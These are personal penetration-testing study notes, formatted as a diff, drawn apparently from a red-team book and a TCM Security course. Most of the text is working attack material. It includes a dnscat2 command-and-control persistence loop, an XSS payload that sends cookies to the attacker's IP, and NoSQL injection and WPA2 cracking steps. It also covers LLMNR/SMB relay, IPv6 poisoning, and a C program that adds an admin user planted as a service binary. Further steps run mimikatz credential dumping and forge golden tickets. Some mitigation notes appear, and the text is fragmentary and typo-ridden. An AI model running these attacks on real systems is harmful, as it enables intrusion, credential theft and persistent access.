+- ruby ./dnscat2.rb loca1host.com --secret 39dfj3hdsfajh37e8c902j
+
+generally like to start my
+dnscat payload with a quick bash script:
+- >nohup /bin/bash -c "while true; do /opt/dnscat2/client/dnscat loca1host.com --secret 39dfj3hdsfajh37e8c902j --max-retransmits 5; sleep 3600; done" >/dev/null 2>&1 &
+
+OTHER RED TEAM TOOLS
+- p0wnedShell, Pupy Shell, PoshC2, Merlin, Nishang, Recon-NG, Discover, Spiderfoot, Gitrob, Masscan, Sparta, HTTP Screenshot, Vulnerability scanners, Burp suite
+
+
+RED TEAM RECON
+Monitoring an Envt
+- For Red Team campaigns, it is often about opportunity of attack. Not only do you need to have your attack infrastructure ready at a whim, but you also need to be
+constantly looking for vulnerabilities.
+- These are the tools we can use for monitoring
+
+Regular Nmap Diffing
+- >#!/bin/bash
+- >mkdir /opt/nmap_diff
+- >d=$(date +%Y-%m-%d)
+- >y=$(date -d yesterday +%Y-%m-%d)
+- >/usr/bin/nmap -T4 -oX /opt/nmap_diff/scan_$d.xml 10.100.100.0/24 >/dev/null 2>&1
+- >if [ -e /opt/nmap_diff/scan_$y.xml ]; then /usr/bin/ndiff /opt/nmap_diff/scan_$y.xml /opt/nmap_diff/scan_$d.xml >/opt/nmap_diff/diff.txt
+- >fi
+
+Web screenshots
+- >cd /opt/httpscreenshot/
+- >Edit the networks.txt file to pick the network you want to scan: (gedit networks.txt)
+- >./masshttp.sh
+- >firefox clusters.html
+
+https://github.com/ChrisTruncer/EyeWitness
+- >cd /opt/EyeWitness
+- >nmap [IP Range]/24 --open -p 80,443 -oX scan.xml
+- >python ./EyeWitness.py -x scan.xml --web
+
+Cloud Scanning
+- First, it is important to figure out where the IP ranges are owned by different providers. Some of the examples are:
+- Amazon: http://bit.ly/2vUSjED, Azure: http://bit.ly/2r7rHeR, Google Cloud: http://bit.ly/2HAsZFm
+
+Network/Service Search Engines
+- To find cloud servers, there are many great resources freely available on the internet to
+perform reconnaissance on our targets. (Shodan[https://www.shodan.io], Censys.io[https://censys.io/])
+
+
+Manually Parsing SSL Certificates
+We commonly find that companies do not realize what they have available on the
+internet. Especially with the increase of cloud usage, many companies do not have
+ACLs properly implemented. They believe that their servers are protected, but we
+discover that they are publicly facing. These include Redis databases, Jenkin servers,
+Tomcat management, NoSQL databases, and more – many of which led to remote
+code execution or loss of PII.
+
+sslScrape (https://github.com/cheetz/sslScrape):
+- >cd /opt/sslScrape
+- >python ./sslScrape.py [IP Address CIDR Range]
+
+SUBDOMAIN DISCOVERY
+Why are subdomains so important to find for your victim targets? A few reasons are:
+Some subdomains can indicate the type of server it is (i.e. dev, vpn, mail,
+internal, test). For example, mail.cyberspacekittens.com.
+Some servers do not respond by IP. They could be on shared infrastructure and
+only respond by fully qualified domains. This is very common to find on cloud
+infrastructure. So you can nmap all day, but if you can’t find the subdomain,
+you won't really know what applications are behind that IP.
+Subdomains can provide information about where the target is hosting their
+servers. This is done by finding all of a company's subdomains, performing
+reverse lookups, and finding where the IPs are hosted. A company could be
+using multiple cloud providers and datacenters.
+
+Discover Scripts
+Discover Scripts (https://github.com/leebaird/discover) tool is still one of my favoriterecon/discovery tools discussed in the last book
+
+KNOCK
+- Next, we want to get a good idea of all the servers and domains a company might use.
+Although there isn’t a central place where subdomains are stored, we can bruteforce
+different subdomains with a tool, such as Knock, to identify what servers or hosts
+might be available for attack.
+- Knockpy is a python tool designed to enumerate subdomains on a target domain
+through a wordlist.
+
+Sublist3r, SubBrute, Truffle Hog
+
+S3 Bucket Enumeration
+There are many tools that can perform S3 bucket enumeration for AWS.
+- Bucket Finder, SimplyEmail
+
+Additional Open Source Resources for monitoring
+- Collection of OSINT Links:
+- https://github.com/IVMachiavelli/OSINT_Team_Links
+- OSINT Framework: http://osintframework.com/
+
+3 THE THROW - WEB APPLICATION EXPLOITATION
+- http://bit.ly/2GZbVZd and https://www.owasp.org/images/1/19/OTGv4.pdf
+
+Bug Bounty Programs:
+- The most common question we get is, “how can I continually learn
+after these trainings?” My best recommendation is to do it against real, live systems.
+You can do training labs all day, but without that real-life experience, it is hard to
+grow.
+- The more common bug bounty programs are HackerOne (https://www.hackerone.com), BugCrowd (https://bugcrowd.com/programs) andSynAck (https://www.synack.com/red-team/).
+https://www.vulnerability-lab.com/list-of-bug-bounty-programs.php, http://pages.ebay.com/securitycenter/Researchers.html
+- If you need help creating consistent reports, take a look at this report
+generation form: https://buer.haus/breport/index.php.
+
+- To set up the demo for the Web Environment (Customer System Support):
+- Download the Custom THP VM from: (http://thehackerplaybook.com/get.php?type=csk-web)
+- Download the full list of commands for the labs: (https://github.com/cheetz/THP-ChatSupportSystem/blog/master/lab.txt, Bit.ly Link: http://bit.ly/2qBDrFo
+- Boot up and log into the VM
+- When the VM is fully booted, it should show you the current IP address of the
+application. You do not need to log into the VM nor is the password
+provided. It is up to you to break into the application.
+Since this is a web application hosted on your own system, let's make a
+hostname record on our attacker Kali system:
+- On our attacker Kali VM, let's edit our host file to point to our
+vulnerable application to reference the application by hostname versus
+by IP: (gedit /etc/hosts)
+- Add the following line with the IP of your vulnerable application: [IP Address of Vuln App]chat
+- Now, go to your browser in Kali and go to http://chat:3000/. If
+everything worked, you should be able to see the NodeJS Custom Vuln
+Application.
+
+Setting Up Your Web Application Hacking Machine
+- Arming yourself with browsers. Many browsers act very differently especially
+with complex XSS evasion:Firefox, Chrome, Safari, Wappalyzer, BuiltWith, Retrire.JS, Burp Suite
+- Before we do any type of scanning, it is important to try to understand the underlying
+code and infrastructure. How can we tell what is running the backend? We can use
+Wappalyzer, BuiltWith, or just Google Chrome inspect. In the images below, when
+loading up the Chat application, we can see that the HTTP headers have an X-Powered
+By: Express.
+
+- https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content
+
+Cross-Site Scripting XSS
+- XSS attacks are client-side attacks that allow an attacker to craft a
+specific web request to inject malicious code into a response.
+- Everything from poor
+coding, to not understanding frameworks, and sometimes applications just get too
+complex and it becomes hard to understand where an input goes.
+
+
+- Because the alert boxes don't really do any real harm, let's start with some of the basic
+types of XSS attacks:
+- Cookie Stealing XSS: <script>document.write('<img src="http://<Your IP>/Stealer.php?cookie=' %2B document.cookie %2B '" />');</script>
+- Forcing the Download of a File: <script>var link = document.createElement('a'); link.href =
+'http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe'; link.download = ''; document.body.appendChild(link); link.click();</script>
+- Redirecting User: <script>window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
+- Other Scripts to Enable Key Loggers, Take Pictures, and More http://www.xss-payloads.com/payloads-list.html?c#category=capture
+
+Obfuscated/Polyglot XSS Payloads
+- https://github.com/foospidy/payloads/tree/master/other/xss
+- https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+- There are some HTML Event Attributes that execute JavaScript when triggered
+(https://www.w3schools.com/tags/ref_eventattributes.asp)
+Attributes that execute JavaScript being outside a <script> tag:
+- <b onmouseover=alert('XSS')>Click Me!</b>
+- <svg onload=alert(1)>
+- <body onload="alert('XSS')"><img src="http://test.cyberspacekittens.com" onerror=alert(document.cookie);>
+
+XSS mind map (http://bit.ly/2qvnLEq)
+
+- BeEF is broken down into two parts: one is the server and the other is the attack payload. To start the server:
+- Start BeEF on Your Attacker Kali Host
+- From a Terminal (beef-xss)
+- Authenticate with beef:beef
+- View http://127.0.0.1:3000/hook.js
+- Full Payload Hook File:
+- <script src="http://<Your IP>:3000/hook.js"></script>
+
+Blind XSS
+- it is when an execution of a stored XSS payload is not
+visible to the attacker/user, but only visible to an administrator or back-end employee
+- we can use XSSHunter (https://xsshunter.com) to help us validate the Blind XSS.
+
+XSS Hunter:
+- Disable any Proxies (i.e. Burp Suite)
+- Create account at https://xsshunter.com
+- Login at https://xsshunter.com/app
+- Go to Payloads to get your Payload
+- Modify the payload to fit your attack or build a Polyglot with it
+- Check XSS hunter to see the payload execution
+
+XSS to Compromise
+- https://github.com/Varbaek/xsser. Hans-Michael presented some great examples and videos on recreating an XSS to RCE
+attack.
+
+NoSQL Injections
+- In MongoDB, we can use one of the following conditional operators: (>) greater than - $gt, (<) less than - $lt
+(>=) greater than equal to - $gte, (<= ) less than equal to - $lte
+
+Attack the Customer Support System NoSQL Application
+- First, walk through the NoSQL workflow on the Chat application:
+- In a browser, proxying through Burp Suite, access the Chat application:http://chat:3000/nosql
+- Try to authenticate with any username and password. Look at POST traffic that was sent during that authentication request in Burp Suite
+
+Server Source Code in NoSQL app
+- db.collection(collection).find({"username":username, "password":password}).limit(1)…
+
+Injecting into NoSQL Chat
+- In a browser, proxying through Burp Suite, access the Chat application: http://chat:3000/nosql
+- Turn "Intercept" on in Burp Suite, click Login, and submit a username as admin and a password of GuessingAdminPassword
+- Proxy the traffic and intercept the POST request
+- {"username":"admin","password","GuessingAdminPassword"} to
+- {"username":"admin","password":{"$gt":""}}
+- You should now be logged in as admin!
+
+Advanced NoSQLi
+- For example, we can have a POST request like the following:username=admin&password[$gt]=
+- And the server-side request conversion would translate to: {"username":"admin", "password":{"$gt":""}
+- This now looks similar to the original NoSQLi attack.
+- Now, our request looks identical to the NoSQLi we had in the previous section. Let's see this in action:
+- Go to http://chat:3000/nosql2
+- Turn Burp Intercept On
+- Log in with admin:anythingModify the POST Parameter:
+- username=admin&password[$gt]=&submit=login
+
+
+
+4 THE DRIVE - COMPROMISING THE NETWORK
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+shutdown -h now (shuts the whole system down)
+
+HACKING LAYER 2 DEVICES
+
+- This can be done using a tool called Yersinia, which is used to launch different
+attacks to layer 2 devices of the network like routers and switches.
+
+- It can be used to hack into the DHCP pool if not configured well and we can then use kali linux as the server through traffic to pass before reaching the internet and we can also make the kali machine act as our DHCP server that allocates IP addresses to the devices
+and thereafter run a command in the terminal of kali linux that allows kali to forward traffic that is sent to it as it acts the server. (sysctl -w net.ipv4.ip_forward=1 or any number)
+
+- The traffic through kali linux can be visualized through wireshack to see the information sent by any person 
+connected to the DHCP linux server
+
+- Hacking into the ARP caches Ettercap
+
+RUNNING A WIRELESS ADAPTER ON KALI LINUX
+- install the drivers from github for the external wifi driver
+- check uisng ifconfing for the connection of the adapter to kali linux
+- type (airmong-ng check kill) to kill any process associated
+- type (iwcnfig wlan0 mode monitor) to turn to monitor mode
+- type (ifconfig wlan0 up) to monitor the connected adapter.
+- type (airodrump-ng wlan0) to start the monitor
+- type (aireplay-ng --test wlan0) to test if you can inject into the wlan0
+
+NB: We enable dhcp snooping when configuring to avoid MMIT attacks fro any device
+
+CHANGING THE MAC ADDRESS OF THE COMPUTER
+- type (getmac) to show all the avalible mac addresses
+- select the correct mac you want to change
+- open the registry editor for windows and allow making changes
+- Go to HKEY LOCAL MACHINE, system, controlset01, class in the registry editor of a windows machine
+- get the 1st portion of the mac address you want to change, right to find and paste that portion where you will get a folder having sub folders like 001, 002, 003, etc
+- verify that the NetCfgInstanceId is the same as the value shown in the getmac command(mac address you want to change)
+- right click in the white space and create a new (string value)
+- go to the new string and give it a name.
+- right click on the new name and go to edit string where you can provide a new mac address 
+- use 2 or 6 or E or A in the second character followed by any other number of the new mac address to avoid failure
+- make sure the mac has got the same number of characters as the original mac you want to change.
+- go to the network adapter you changing its mac and disable it and after some time re-enable it
+- when it starts and check its details, its mac has changed at this point.
+
+- in linux, we can use the mac address change 
+- type (macchanger -s eth0) to show the mac address of the device
+- type (macchanger -r) to create a new mac address randomly. this changes the mac of your device to any new random mac.
+
+DYNAMIC ARP INSPECTION
+- this allows to prevent arp poisoning and MMIT attacks
+- these attacks can be avoided through configuring (dhcp snooping) on the interfaces of the switch or manually configuring the mac addresses.
+- configuring snooping
+conf t
+ip dhcp snooping
+ip dhcp snooping vlan1
+no ip dhcp snooping information option
+exit
+show ip dhcp snooping
+
+- Enable Dynamic ARP Inspection
+conf t
+ip arp inspection vlan 1
+ip arp inspection validate src-mac
+int G0/0
+ip arp inspection trust
+end 
+show ip arp inspection
+
+- limit the snooping to any number of packets through any interface
+int G0/1
+ip dhcp snooping limit rate 10
+end
+
+NB: Someone can therefore not be able to poison our networks with the hacking tools like ettercap
+
+HACKING WIRELESS NETWORKS
+- You can buy an adaptors that supports monitor mode and packet injection.
+- Connect the adaptor and direct it to where you want it to run.
+- Get a router to you want to attack
+- use Wifite to test the networks.
+- When it starts, let it discover the networks and then specify the network you want to attack.
+- sudo wifite --wpa --dict wifipass.txt --kill
+- sudo apt install hcxdumptool
+- apt install hcxtools
+- sudo apt-get install libpcap-dev
+- sudo apt-get install python3-dev libss1-dev zlib1g-dev libpcap-dev
+- git clone https://github.com/JPaulMora/Pyrit.git
+- cd pyrit
+- sudo python setip.py clean
+- sudo python setup.py build
+- sudo python setup.py install
+
+CRACKING PASSWORD
+- Insert a wireless adaptor that supports monitor and packet injection.
+- Use fern wifi aircracker to crack the password in kali to crack the password.
+
+ATTACKING PORTS
+- Port attacking can be done using hydra in kali
+
+BRUTE-FORCE ATTACK ON WPA2 passsword
+- For this to work, you need access to a GPU to do this attack quickly.
+- You should have a wireless adapter
+- ip addr
+- sudo wifite --wpa --kill
+- Type the number of the network you want to attack
+- Type C, if you want processes to be fast.
+- Open terminal look for hashcat software, and enter the directory
+- type hashcat.exec to see the GPUs avaiable on the computer.
+- type hashcat.exe -m 2500 -a 3 wpa2.hccapx ?d?d?d?d?d?d?d
+- It tells hascat to do a brute force using digits.
+- You can visit hashcat to see more details.
+
+WINDOWS PENETRATION TESTING
+- This testing is gonna upon the active directory of windows
+- Here you need to use different method to collect information that you need to use for testing the os
+- You can collect the Ip addresses, users of the system, domain groups(admin, users, com, enterprise) and others
+- the krbtgt is used to sign certificated that can be used to sign into a system pretending to be the user
+- You shd always avoid to signin as a root
+- Enterprise admin is the person that has full access to all machines connected to anetwork
+- Local admin is a person that has full access to one singel device.
+
+- Connecting to a windows machine using kali linux
+- attack path looks like this
+---> Micheal-> RDP WEB02-> if admin: Steal Mary's Credentials(if not - escalate) - Access FILES02->?
+
+
+------> xfreerdp /u:micheal /p:My1337PAssword! /d:corp.com /v:192.168.1.50 /w:1920 /h:1080 /fonts /smart-sizing
+
+- xfreerdp is installed in kali
+- username is micheal and the password we all collected during enumeration
+- /d:corp.com is the domain name and the Ip address to which the windows machine is connected
+- The rest are just some fancy staff
+
+- run commands like
+(hostname, whoami, cls, net user, whoami /groups)
+
+- Privilege escalation is elevating your privileges from one user to another and can be tricky
+- You can use WinPEAS for enumeration to get users and the kind of permissions they have on a given system.
+- But sometimes you have to put so much trust in these tools but rather do the enumeration manuaaly.
+
+- Doing enumeration manually (powershell)
+- Cim ---> Common Information Model
+- run ----> Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object {$-.State - like 'Running'}
+- Look for anomalies, files with .exe like mysqld.exe, and its exe for those services mainly for the installed applications
+- The goal here is to replace this exe file, copy the exe file and use ICACLS to enumerate binariess and folders
+- run ----> icacls C:\xampp\apache\bin\http.exe
+- If you see (F)-->full access, (I)-->Inherit permissions from parent folder, (RX)-->Read, Exe
+
+- run ----> icacls C:\xampp\mysql\bin\mysqld.exe
+- run ----> whoami /groups 
+- icacls ----> Integrity Access Control Access List ( used to enumerate access list on binaries and folders)
+
+- Create the file you want to replace with exe using any text editor and paste the code that can help you get admin access in windows
+#include <stdlib.h>
+int main ()
+{
+	int i;
+	i = system ("net user mighty password123! /add");
+	i = system ("net localgroup administrators might /add");
+	return 0;
+}
+- Save the file
+- Compile the file into an executable using ( x86_64-w64-mingw32-gcc adduser.c -o adduser.exe ) for windows
+
+- Setup a web server in kali (python3 -m http.server 80)
+- In the windows machine, type hostame to confirm and create a folder called anyname and nav to it
+- run -----> iwr -Uri http://192.168.1.47/adduser.exe OutFile adduser.exe
+- type -----> move c:\xampp\mysql\bin\mysqld.exe backup_mysqld.exe
+- type -----> move .\adduser.exe c:\xampp\bin\mysqld.exe
+
+ESCALATING PRIVILEGES
+- type -----> net stop mysql (but gives Access is denied)
+- run ----> Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object StartMode  (brings mode of the denied service)
+- type ----> Restart-Computer -Whatif
+- type ----> whoami /priv
+- run ----> restart-computer (in powershell)
+
+- After the machine restarts, in kali machine
+- run ----> xfreerdp /u:mighty /p:password123! /v:192.168.1.50 /w:1920 /h:1080 /fonts /smart-sizing
+- type ---> whoami
+- type ---> whoami /groups
+
+ACTIVE DIRECTORY (windows)
+- type ---> cd c:\users\mighty
+- type ---> mkdir pentest
+- type ----> cd pentest and then ls
+
+-  run ----> iwr -uri http://192.168.1.47/mimikatz.exe -OutFile mimikatz.exe
+
+- mimikatz is a tool used to tap into the memory of a given process in active directory called LSASSS 
+- LSASSS ---> Local System Authority Sub-system Service  & functions as aprt of os that maintains and enforces security & tickets & NTLM hashes maybe be kept here
+- We have2 auth methods in active directory by default ie KERBEROS & NTLM authentication(insecure)
+- When you NTLM to get the hash of a user, you easily enter the machine and you use the password and 
+NTLM can allow access even though you set the strongest psd
+- KERBEROS is the best to use
+- As you long in, with K, the client sends auth server req is sent on KDC(Key Distribution Center) which runs on the domain controller
+- Request contains a timestamp thats encrypted using the hash which is derived from the password of the user logging In
+- Domain Control(DC) that has access to all the pswd hashes receives the request, tries decrypting the timestamp by looking thorugh the hashes
+- If the hash match, auth is successful and DC sends a reply with auth server rply
+- The DC reply contains the juicy info to be used which is the Session Key(encrypted with user's pswd) & Ticket Granting Ticket(TGT) 
+- TGT contains the info abt the user eg username, groups user has access, etc and encrypted using Secret Key which is the NTLM hash for the KRBTGT account, 
+the very super important account in active directory and KRBTGT belongs to KDC
+- After this, the client essentially shows the Ticket to KDC for access to resources
+- NTLM is used in IP address auth instead of hostname, authing username not registered in AD-Integrated Domain Server, third party apps
+- Systems may not be compatible with KERBEROS & you need to really do the testing so well such that systems dont break.
+
+- Talk to the client before doing actions that may wipe out all the data or bypassing when using these hacking tools
+- run ---> .\mimikatz.exe in windows
+- NB: pingastle is great tool for gathering data files and present it in a report (does enumeration)
+
+- run ---> privilege::debug, enables the CSEDE debug privilege to allow process for user to run some level of sys resources
+- run  --> sekurlsa::logonpasswords, checks for all the pswds and look for a hash you want for the user youre looking at
+
+- In kali, /usr/bin/impacket-wmieexc, can be used by system admsto remotely manage systems
+- run /usr.bin/impacket-wmexec -hashes :hash you got from windows corp/user@ip_address, you can also use metasploit
+- the command needs port 135 to be open on target and we need to be local admins on the target machine
+- the command can then login you into the windows machine 
+- c:\>whomai
+- c:\whoami /groups
+- c:\>cd users
+- c:\user>dir
+- c:/users\jeff\dir
+- c:/users\jeff>cd appdata\roaming\microsoft\windows\powershell\psreadline, after, type ConsoleHost_history.txt
+- in kali, run --> xfreerdp /u:jeff /p:INeedOSPNow123! /d:corp.com /v:192.168.1.71 /w:1920 /h:1080 /fonts /smart-sizing
+- If you start the cmd as admin and it does not require you to have the pswd, you should take a snap and tell the responsible person
+- hostname, whoami
+
+- If you want to log into the system 5 yrs ahead, you can forge/fake a TGT ticket that appears legitemate using Kerberos hash
+- To create the Golden ticket, we need acces to the domain controller(security ID) and KRBTGT hash
+- You can create folder & move into it to download mimikatz
+- run --> iwr -uri http://192.168.1.47/mimikatz.exec -outfile mimikatz.exec
+- run --> privilege::debug
+- run --> lsadump::lsa /patch
+- look for Domain SID: and KRBTGT Hash:
+- in kali: run --->xfreerdp /u:micheal /p:My1337Password! /d:corp.com /v:192.168.1.71 /w:1920 /h:1080 /fonts /smart-sizing
+- in windows look for mimikatz and run it
+- run --> kerberos::purge
+- create the golden ticket
+- mimikatz# kerberos::golden /user:michael /domain:corp.com /sid:SID /krbtgt: KRBTGT [(/endin:time you want)--optional] /ticket:corp_golden
+- mimikatz# kerberos::ptt corp_golden (but you cant start cmd right away)
+- mimikatz# misc::cmd
+- c:\Tools>PsExec64.exe \\dc01 cmd.exe
+- c:\windows\system32>whoami \groups
+- c:\windows\system32>net user, net user mighty Password123! /add /domain, net user mighty /domain, net group "domain admins" mighty /add /domain
+
+		HEATH ADAMS (TCM SECURITY)
+- Hacking into the active directory (its like a phone book, login users, add them to groups and give them permiisions)
+1. LLMNR(Link Local Resolution) Attack
+- Use send a broadcast & the hacker can capture the user details
+- Used to identify hosts when DNS fails to do so
+- Previously NBT-NS
+- Key flaw is that the services utilize a user's username & NTLMv2 hash when approprately responded to 
+
+- Here we use a tool called responder to listen for the details of any user based on the broadcast
+- in kali: run ---> sudo responder -I etho -dPv IP-address
+- nano hash.txt where you can save the hash
+- Use tools like hashcat, johnthereeper but on the host OS to do the pswd cracking
+- in the host os, run --> hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt or rockyou2021.txt
+
+- The best defence in this case is to disable LLMNR and NBT-NS
+---> To disable LLMNR, select "Turn OFF Mulitcast Name Resolution" under Computer Configuration > Administration Template > Network > DNS Client in the Group Policy Editor
+---> To disable NBT-NS, nav to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP".Or just write a simple logon script...
+
+- If a company must use or cannot disbale LLMNR/NBT-NS, the best course of action is to:
+---> Require Network Access Control
+---> Require strong user passwords (eg.,>14 characters in len & limit common word usage). 
+---> The more complex * longer the pswd, the harder it is for an attacker to crack the hash.
+
+SMB RELAY
+- Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific manchines & potentially gain access
+Requirements:
+	- SMB signing must be disabled or not enforced on the target
+	- Relayed user credentials must be admin on machine for any real value
+
+- finding hosts having SMB diasabled --> nmap --scripts=smb2-security-mode.nse -p445 192.168.138.136 -Pn 
+----> nano target.txt and add the IP that you want to relay but not yourself where SMB is not signed
+----> sudo mousepad /etc/responder/Responder.conf and turn off SMB and HTTP
+----> sudo responder -I eth0 -dPv
+---> sudo ntlmrelayx.py -tf target.txt -smb2support  in another terminal
+- Get the hashes of admin and user
+
+- You can run another relay
+- run ----> ntmrelayx.py -tf target.txt -smb2support -i 
+- run netcat to bind or listen on a given port like 7777
+- run ---> nc 127.0.0.1 11000
+	---> (run ---> nc -nvlp 7777 ----> nc IP 11000)
+
+- run ---> psexec.py user.local/otheruser:'Password1'@IP address
+- psexec is a system's internal store and its an admin tool and allows us to get a shell in windows
+- Other tools are wmiexec.py and smbexec but these tools are always defended by antivirus
+- also you can run ---> secretsdump.py username.local/username:"pswd"@ip (-just-dc-ntlm)  
+- history | grep aws 
+
+MITIGATION STRATEGIES OF SMB
+1. Enable SMB siging on all devices
+	- Pro: Completely stops the attack
+	- Con: Can cause performance issues with file copies
+2. Disable NTLM authentication on network
+	- Pro: Completely stops the attack
+	- Con: If Kerberos stops working, Windows defaults back to NTLM
+3. Account tieriin
+	- Pro: Limits doamin admins to specific taks (eg only log onto servers with need for DA)
+	- Con: Enforcing the policy may be difficult
+4. Local admin restriction
+	- Pro: Can prevent a lot of lateral movement
+	- Con: Potential increase in the amount of service desk tickets
+
+c:\Users\fcastl>reg query HKLM\System\CurrentControlSet\Set\Services\LanManServer\Parameters | findstr /I securitysignature
+NB: You can use BITWAN to check for vulnerabilities
+
+GAINING SHELL ACCESS
+- You can use tools like metasploit, psexec.py, wmiexec, smbexec
+
+IPv6 ATTACKS
+- run ---> sudo mitm6 -d marvel.local
+- This is becoming a DNS server & can cause issues so dont run it more than 5X in a network & can really take down a network
+- Another terminal
+- run ---> sudo ntlmrelayx.py -6 -t ldaps://ip-address -wh fakewpad.marvel.local -l lootme
+- lootme is any folder name you want and this tool does not have any problem
+- You can restart the target machine & this tool will collect information as your loggingin in the folder called lootme
+- get the user & the password and save them somwhere
+- run ---> secretsdump.py user:@ip-address -just-dc-ntlm
+- When it asks for a pswd, paste the pswd you copied from the collected use info
+- It displays all the NTLM accounts with their hashes on the target system
+
+MITIGATION OF IPv6 ATTACKS
+- IPv6 poisoning abuses the fact that windows queries for an IPv6 address even in IPv4-only envts.
+- If you dont not use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic & incoming router advertisements in windows firewall via Group Policy
+- Disabling IPv6 entirely may have unwanted side effects
+- Setting the followin predefined rulles to Block instead of allow prevents from working:
+a. Inbound/Core Networkinh: DHCP for IPv6(DHCPV6-In)
+b. Inbound/ core netowrking: Router advertisemenent(ICMPv6-In)
+c. (Outbound)Core Networking: DHCP for IPv6(DHCPV6-Out)
+
+- If WPAD not in use internally, disble it via Group Policy & by disabling the WinHttpAutoProxySvc service
+- Relaying to LDAP & LDAPS can only be mitigated by enabling bot LDAP signing & LDAP channel binding
+- Consider Administrative usersn to be the Protected Users group or marking them as Account is sensitive & cant be delegated which will prevet any imperosnation of that user via delegation
+
+PASS THE PASSWORD/PASS THE HASH
+
+CREATING A HACKING LAB
+- Download the virtualization technology either virtualbox, vmware, hyper v
+- Download kali for that machine & the vulnlab machine that contains what to hack
+- Start those machines up in the virtual machines
+- Set the machines on the same network by enabling (internal network) in the network settings of the machines & give a name to the network but name shd be the same for the both machines
+- But at this time, the internal network does not have a DHCP server to assing IP addresses
+- cd to the directory where your virtual machines is installed from 
+- run --> vboxmanage dhcpserver add --network=nameofinternalnetwork --server-ip=10.38.1.1 --lower-ip=10.38.1.110 --upper-ip=10.38.1.120 --netmask=255.255.255.0 --enable
+- Lower & upper is the pool of addresses
+- Start the kali machine and login & the vulnlab machine
+- But at this point, we dont know the passwd to enter the vulnlab machine where we need to do enumeration so as to hack into the machine to get the pswd
+Enumeration process into the set internal network to chech which machnes are connected to this network where the vulnlab machine is connected too
+- In kali, run --> sudo nmap -sS -T4 10.38.1.110-120
+
+
+SETTING UP A CYBER LAB
+1. install a virtual machine such as vmare, virtual box or hyper v
+2. install a vm version of kali into your system
+3. import or start the downloaded kali image into the vm
+4. cd /opt/ dir in kali through terminal
+5. install pimpmykali in the start vm kali image through git cloning
+6. run pimpmykali.sh file installed in the /opt/
+7. enter if its the first time using kali in your vm machine
+8. install docker.io
+9. install docker-compose
+10. Restart your vm to make sure that all your services are running
+11. get the bugbounty-v1.0.zip file 
+12. unzip it & navigate to the unzippedd file
+13. cd to the unzipped file
+14. run docker-compose up within the dir
+15. if it refuses to run showing that the port:80 is used
+16. run >sudo systemctl stop apache2 or >sudo docker ps -a (to see which docker services are running)
+17. look for the process ID running at port:80 & port:8080
+18. run >sudo docker stop processID
+19. then run back >sudo docker-compose up
+20. run ./set-permissions.sh file in the unzipped file
+21. go to browser & enter : localhost & switch on the browser proxy if its off, there you will see all the bugbounty lab
+
+response codes:
+- 1XX: informational
+- 2XX: successful
+- 3XX: redirection
+- 4XX: client errors
+- 5XX: server erros
+
+RECONESENCE
+-> Knowing the architeral design of the website
+1. know the tecnhnologies with which the website is built, you use builtwith.com or download wappalyzer for your browser (wappalyzer install)
+2. when its installed, and cliked, it will ask you to add to your browser
+3. it has a purple icon in top right nav and when you enter the website and click this purple icon, it will show all the technlogies of that website
+
+4. ->curl -I website (can collect more info about the webiste)
+5. if you get a redirect, use ->curl -I -L website (until you get 200 status code)
+6. you can use securityheaders.com to check the headers of the website
+
+7. you can also use nmap as ->nmap -p443 -A webiste (but you may get some errors not the real web)
+8. ->nmap -p443 --script=http-server-header webiste.com (but nmap is good for scanning ports)
+9. you can scan diff ports as ->nmap -p80, 443 -A website.com
+
+DIRECTORY ENUMERATION & BRUTE FORCING on a website(tools to use)
+1. sudo apt install ffuf (Fuz Faster U Fool) (these are automated attacks)
+- >ffuf --help
+- >ffuf -W /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.0.10:8080/FUZZ (if you donot know any web sub dirs)
+- >ffuf -W /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.0.10:8080/admin/FUZZ (if you know the dir admin or any else)
+
+2. dird (builtin in kali linux)
+- >dirb http://ip_address
+
+3. dirbuster (builtin in kali linux)
+- >dirbuster& (you run wuth & or not)
+
+SUBDOMAIN ENUMERATION
+- eg dev.azena.com, .com-top-level domain, azena-second-level domain & dev-sub-domain
+- you can find sub level domain from a browser eg 
+1. site:azena.com 
+2. site:azena.com -www 
+3. site:azena.com -www -store)
+4. site:azena.com filetype:pdf or txt or xlxs or pdf password
+
+- you can use websites to find subdomains such as crt.sh
+- crt.sh (%.azena.com)
+
+- you can use cmd tools
+1. sudo apt install subfinder
+- >subfinder -d website.com 
+- >subfinder --help
+- >subfiner -d website.com -0 filename (writing to a file)
+
+2. assetfinder (greater tool)
+- >assetfinder azena.com
+- >assetfinder azena.com | grep azena.com | sort -u > outputfile.txt (search for anything containing azena.com & sorted uniquely & stored in a file)
+
+3. amass (takes some time)
+- >amass enum -d azena.com > outputfilename
+
+4. httprobe (builtin in kali to test live subdomains)
+- >cat azenafinal.txt | grep azena.com | sort -u | httprobe -prefer -https | grep https > azenaalive.txt
+
+5. gowitness (buitlin kali)
+- >mkdir dir_name
+- >gowitness file -f azenaalive.txt -P (screenshot path) azenapics --no-http
+
+BURP SUITE
+- this is web proxy
+- downoload a tool callde FoxyProxy for firefox
+- add it to firefox through the add button
+- you get an icon in firefox for this tool in the upper right conner
+- click the icon & to go to options to add any proxy
+- add a title, ip & port the website
+- click on the icon and choose the proxy to use
+- enter http://burp to check if burp suite is communication with the proxy
+- download the CA certificate
+- go to firefox settings & at the bottom look for view certificates
+- click on it & import the CA certificate you have downloaded
+- go to proxy in burp suite & turn intercep ON to capture the traffic
+- burp will capture the traffic until you want to forward it to render in the browser
+- target in burp pickups all the webs we visit
+
+BRUTE FORCING USER AUTHENTICATION
+
